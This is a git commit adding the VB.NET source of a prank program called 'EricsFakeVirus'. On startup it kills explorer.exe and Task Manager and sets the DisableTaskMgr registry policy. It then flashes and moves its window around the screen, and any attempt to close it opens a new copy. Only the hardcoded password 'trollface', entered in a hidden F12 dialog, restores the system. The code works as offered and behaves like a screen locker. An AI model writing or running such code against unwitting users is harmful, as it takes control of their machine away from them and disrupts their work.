db5245c91fdae9cd6b2a7608341e02d7556e4b51
egold555 <eric@golde.org>
2016-02-24 22:26:34 -0800

    Initial Commit
    Initial Commit of project

---
+++ EricsFakeVirus/Form1.vb
@@ -0,0 +1,58 @@
+﻿Public Class Form1
+
+    'Define the variables
+    Dim rnd As New Random
+    Dim RegKey As Object
+
+    Private Sub Form1_Shown(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Shown
+        'Places the form in a random location upon startup
+        Me.Location = New Point(rnd.Next(0, My.Computer.Screen.WorkingArea.Width - Me.Size.Width), rnd.Next(0, My.Computer.Screen.WorkingArea.Height - Me.Size.Height))
+
+        'Starts playing the trololol theme song in a loop
+        ' My.Computer.Audio.Play(My.Resources.trololol, AudioPlayMode.BackgroundLoop)
+    End Sub
+
+    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
+        'Check if the user entered the password; else abort shutdown
+        If Form2.Label2.Text = "1" Then
+
+        Else
+            e.Cancel = True
+            Dim newForm As New Form1
+            newForm.Show()
+        End If
+    End Sub
+
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        'Flash between the red and blue background color
+        If Me.BackColor = Color.Blue Then
+            Me.BackColor = Color.Red
+        Else
+            Me.BackColor = Color.Blue
+        End If
+    End Sub
+
+    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
+        'Randomly move the window around inside the screen bounds
+        Me.Location = New Point(rnd.Next(0, My.Computer.Screen.WorkingArea.Width - Me.Size.Width), rnd.Next(0, My.Computer.Screen.WorkingArea.Height - Me.Size.Height))
+    End Sub
+
+    Private Sub Form1_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyDown
+        'Monitor the F12 key while one of the forms are selected
+        If e.KeyCode = Keys.F12 Then
+            Form2.Show()
+        End If
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        'Kill the explorer.exe and the taskmgr.exe process
+        Shell("taskkill.exe /f /im explorer.exe", AppWinStyle.Hide)
+        Shell("taskkill.exe /f /im taskmgr.exe", AppWinStyle.Hide)
+
+        'Disable the taskmanager using the registry (this is what requires admin permissions on windows vista/7)
+        RegKey = CreateObject("WScript.Shell")
+        RegKey.RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
+    End Sub
+
+
+End Class
---
+++ EricsFakeVirus/Form2.vb
@@ -0,0 +1,39 @@
+﻿Public Class Form2
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+        'Check if the user entered the correct password.
+        If TextBox1.Text = "trollface" Then
+            'Password accepted. Preparing to shutdown....
+
+            'Re-enables the task manager
+            Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
+
+            'Opens explorer.exe back up again
+            Shell("explorer.exe")
+
+            'Changes the value on form1 to 1 to tell the program its ok to close
+            Label2.Text = "1"
+
+            'Lag the program for half a second (500 milliseconds) to make sure the value changed before the app sends the close request
+            Threading.Thread.Sleep(500)
+
+            'Send the close message
+            Application.Exit()
+        Else
+            'Password declined.
+
+            'Display an error showing that the password was wrong. (and ofc troll the user abit!)
+            MessageBox.Show("Password Is Wrong. U mad bro?", "((:D)", MessageBoxButtons.OK, MessageBoxIcon.Error)
+
+            'Clears the password textbox!
+            TextBox1.Clear()
+
+            'Focuses input on the textbox again
+            TextBox1.Focus()
+        End If
+    End Sub
+
+    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+    End Sub
+End Class
